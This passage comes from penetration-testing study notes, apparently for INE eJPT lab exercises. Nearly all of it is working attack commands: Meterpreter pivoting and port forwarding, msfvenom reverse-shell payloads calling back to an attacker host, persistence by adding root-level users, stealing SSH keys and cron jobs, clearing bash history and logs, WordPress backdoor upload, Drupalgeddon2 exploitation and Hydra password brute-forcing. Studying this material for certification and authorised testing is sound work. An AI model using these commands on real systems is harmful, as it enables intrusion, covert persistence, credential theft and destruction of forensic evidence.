net view 10.2.20.131

# Command above might not work 
migrate -N explorer.exe
shell
net view 10.2.20.131

# We can see that they both have a file share - map them with these commands from the originally compromised machine
net use D: \\10.2.20.131\Documents
net use K: \\10.2.20.131\K$

```


Pivoting Port forward (From Lab notes)

```
# After compromisng the first machine - run autoroute on the same subnet 
run autoroute -s 10.2.31.0/20


# Use metasploit to then scan the second target 
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
exploit


# After discovering that port 80 was open forward the remote port 80 to local port 1234 and grab the banner using Nmap
sessions -i 1
portfwd add -l 1234 -p 80 -r 10.2.27.45  <IP Address of the second machine we cant access>
portfwd list

# Use the same port and localhost to then scan using NMAP 
nmap -sV -sS -p 1234 localhost
# Then exploit the service 
```


Notes from Reddit if struggling 
```
**Meterpreter**  
- setup msf with workspace  
- db_nmap the victim 1  
- use exploit to gain meterpreter session  
- run ipconfig in meterpreter and gain the subnet network address  
- `run autoroute -s <TARGET1_SUBNET_NETWORK with cidr>` *THIS IS ONLY APPLICABLE FOR MSFCONSOLE AND WON'T WORK WITH BROWSER i.e. targetIP:80 will not open in browser* *PORT-FORWARDING IS NEEDED*  
- name the session victim 1 and put it in background  
`use auxiliary/scanner/portscan/tcp`  
`set RHOSTS <TARGET2_IP>`  
`set PORTS 1-100`

**Port Forwarding**  
`sessions 1`  
`portfwd add -l <your LOCAL_PORT> -p <TARGET2_PORT> -r <TARGET2_IP>`  
`background`  
`db_nmap -sS -sV -p <your LOCAL_PORT> localhost`

**Target2 Exploitation**  
use exploit/windows/http/badblue_passthru
set payload windows/meterpreter/bind_tcp  
set RHOSTS <TARGET2_IP> 
set LPORT <LOCAL_PORT2>
run
```




## Payloads 

Windows
32bit  
Can be used on both 32 and 64bit 
```
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=Attacker IP LPORT=1234 -f exe > /home/kali/Desktop/Payloadsx86.exe 
```

64bit
```
msfvenom -a x64 -p windows/meterpreter/reverse_tcp LHOST=Attacker IP LPORT=1234 -f exe > /home/kali/Desktop/Payloadsx64.exe 
```

Linux 
Option to output into Elf or Binary file 
32bit
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=Attacker IP LPORT=1234 -f elf > ~/Desktop/Payloads/payload32.exe
```

64bit
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=Attacker IP LPORT=1234 -f elf > ~/Desktop/Payloads/payload64.exe 
```


## Windows Persistence 

```
# RDP - Meterpreter
background

use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
set SESSION 1

# Regain access in another msfconsole to regain the access 
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_IP>   # Could use eth1 
set LPORT <LOCAL_PORT> # use same port as previous 


# Switch back to the active meterpreter session and reboot the machine 
reboot 



# Enabling RDP
use post/windows/manage/enable_rdp
sessions
set SESSION 1
```

## Linux Persistence 

Meterpreter - Manual
```
shell
whoami
	root
cat /etc/passwd
useradd -m ftp -s /bin/bash
passwd ftp
usermod -aG root ftp
usermod -u 15 ftp
groups ftp

# SSH Key
use post/linux/manage/sshkey_persistence
set CREATESSHFOLDER true
set SESSION 1

# Persistence Test
loot
cat /root/.msf4/loot/DATE_Linux_Persistenc_<TARGET_IP>_id_rsa_.txt
# Exit all the msfconsole sessions and close it
exit -y

vim ssh_key # paste Key
chmod 0400 ssh_key
ssh -i ssh_key root@<TARGET_IP>
```


Add users to the system for easy login
```
use post/multi/manage/system_session
set SESSION 1
set TYPE python
set HANDLER true
set LHOST 192.30.182.2
run
```

```
vim test.sh # add users to be added 

/etc/init.d/apache2 start
cp test.sh /var/www/html
```

Manual With SSH key on the system. 
```
ssh user@host                               # connect to ssh
ls -al                                      # find the .ssh file
scp student@demo.ine.local:~/.ssh/id_rsa .  # Exit the session and copy the ssh key to our attack machine

# SSH Back in and delete the wait file 
ssh user@host  
rm wait

# Change the privledge of the rsa key and then use it to login 
chmod 400 id_rsa
ssh -i id_rsa student@demo.ine.local

```

Cron job persistence

```
ps -eaf                                                                          # View if cron process is running 
echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron          # Add python server to cron job to serve files in the students home directory 
crontab -i cron
crontab -l

# Log out and login again to delete wait file 
ssh student@demo.ine.local
rm wait 

# Scan ports - port 8000 should be open in the server 
nmap -p- demo.ine.local 
rm wait

# Quick again use curl to interrogate the servers files on the victims machine and download
curl demo.ine.local:8000
curl demo.ine.local:8000/flag.txt
```

## Clearing Tracks 

Meterpreter
```
clearenv

## Cleanup Meterpreter RC File:
cat /root/.msf4/logs/persistence/<CLEANING_SCRIPT>.rc
background
sessions 1
resource /root/.msf4/logs/persistence/<CLEANING_SCRIPT>.rc
run multi_console_command -r /root/.msf4/logs/scripts/getgui/<CLEANING_SCRIPT>.rc
clearenv
```

On linux
```
history -c
```

Clear bash history
```
cat /dev/null > ~/.bash_history
```

```
# Windows C:\Temp - Metasploit e.g.
cd C:\\
mkdir Temp
cd Temp # Clean this C:\Temp directory
```


# Web Application Penetration Testing

### Enumeration with Curl 

```
curl -I <TARGET_IP>
curl -X GET <TARGET_IP>
curl -X OPTIONS <TARGET_IP> -v
curl -X POST <TARGET_IP>
curl -X POST <TARGET_IP>/login.php -d "name=john&password=password" -v
curl -X PUT <TARGET_IP>
```

The Webdav module is enabled on the Apache Server, Webdav module allows file upload via the **PUT** method.

 Uploading a file with the PUT method.
```
echo "Hello World" > hello.txt
curl demo.ine.local/uploads/ --upload-file hello.txt
```

```
# Attempt to upload file
curl <TARGET_IP>/uploads/ --upload-file hello.txt
# Delete file
curl -X DELETE <TARGET_IP>/uploads/hello.txt -v
```



```
nmap -sS -sV -p 80,443,3306 <TARGET_IP>

# Dirbuster
dirb http://<TARGET_IP>

curl <TARGET_IP>/uploads/ --upload-file hello.txt
curl -X DELETE <TARGET_IP>/uploads/hello.txt -v

# Gobuster
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404

gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r

gobuster dir -u http://<TARGET_IP>/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
```



### Wordpress Enumeration 

Check for 
`/license.txt` or `/readme.html`

Enumerate using wordpress to find plugins 
```
nmap -sV -p 80,443 \
  --script http-wordpress-enum \
  --script-args 'http-wordpress-enum.pluginsdb=/usr/share/nmap/nselib/data/wp-plugins.lst' \
  target2.ine.local -oA wp-plugins-enum

```

```
nmap -sV -p 80,443 --script=http-wordpress-enum,http-enum,http-server-header --script-args=http-wordpress-enum.paths={/} -oN nmap-wp-plugins.txt a<target ip>
```



Wordpress Version 
```
curl https://victim.com/ | grep 'content="WordPress'
```

```
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2   # Get Plugins


curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2    #  Get Themes


curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2   # Extract versions 


```

Wordpress ID brute force 
You get valid users from a WordPress site by Brute Forcing users IDs:

```s
curl -s -I -X GET http://blog.example.com/?author=1
```

If the responses are **200** or **30X**, that means that the id is **valid**. If the the response is **400**, then the id is **invalid**.


**wp-json**

You can also try to get information about the users by querying:

```
curl http://blog.example.com/wp-json/wp/v2/users
```

**`/wp-login.php`** the **message** is **different** is the indicated **username exists or not**. 


#### WPScan

Best plugin scan
```
wpscan --url http://wordpress.local --enumerate p --plugins-detection mixed
```

```

wpscan -h #List WPscan Parameters
wpscan --update #Update WPscan
#Enumerate WordPress using WPscan

wpscan --url "http://wordpress.local" -e t #All Themes Installed
wpscan --url "http://<TARGET_IP>" -e vt #Vulnerable Themes Installed
wpscan --url "http://<TARGET_IP>"  -e p #All Plugins Installed
wpscan --url "http://<TARGET_IP>"  -e vp #Vulnerable Themes Installed
wpscan --url "http://<TARGET_IP>"  -e u #WordPress Users
wpscan --url "http://<TARGET_IP>"  --passwords path-to-wordlist #Brute Force WordPress Passwords


#Upload Reverse Shell to WordPress
http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php



```


Bruteforce Wordpress with WPSCAN using a username file 

```
wpscan --url "http://target.blog/wp-admin.php" -U usernames -P /usr/share/wordlists/rockyou.txt
```


### Wordpress Exploits


```
searchsploit remote webapps wordpress
```

Backdoor upload using metasploit
```
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME admin
set PASSWORD admin
set targeturi /wordpress
exploit

```

Using metasploit to search and exploit for plugins 
```
search duplicator
scanner/http/wp_duplicator_file_read
set RHOSTS target2.ine.local
exploit 
```

### Drupal Enumeration

### Drupal Exploits 

Drupal exploit walkthrough on INE 
https://blog.pentesteracademy.com/lab-walkthrough-drupalgeddon-2-cve-2018-7600-93866c7ad03

Read this for drupal
https://github.com/xonoxitron/INE-eJPT-Certification-Exam-Notes-Cheat-Sheet



In late March 2018, a critical vulnerability was uncovered in Drupal CMS. **Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1** versions were affected by this vulnerability.

It allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or standard module configurations.

A lot of PoC is available to exploit this vulnerability.

[https://ine.com/blog/cve-2018-7600-drupalgeddon-2](https://ine.com/blog/cve-2018-7600-drupalgeddon-2)

Metasploit Module 
```
exploit/unix/webapp/drupal_drupalgeddon2
```

#### HTTP POST Form Attack Using Hydra

To launch a brute force attack against an HTTP POST form, you can use the following command with Hydra:

```
hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V
```

In this command:

- Replace `http://10.10.10.10/` with the target URL.
    
- Adjust the `/login.php:user=^USER^&password=^PASS^:Incorrect credentials` string to match the form data and failure message.
    
- The `-L` flag specifies a file with usernames, and `-P` specifies a file with passwords.
    
- The `-f` flag tells Hydra to stop after the first correct password is found.
    
- The `-V` flag increases the verbosity, showing the attempts in the output.

### Attacks General

Brute force web form with Hydra
```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:Invalid username or password"
```


```
hydra -L /usernames -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:login_error"
```
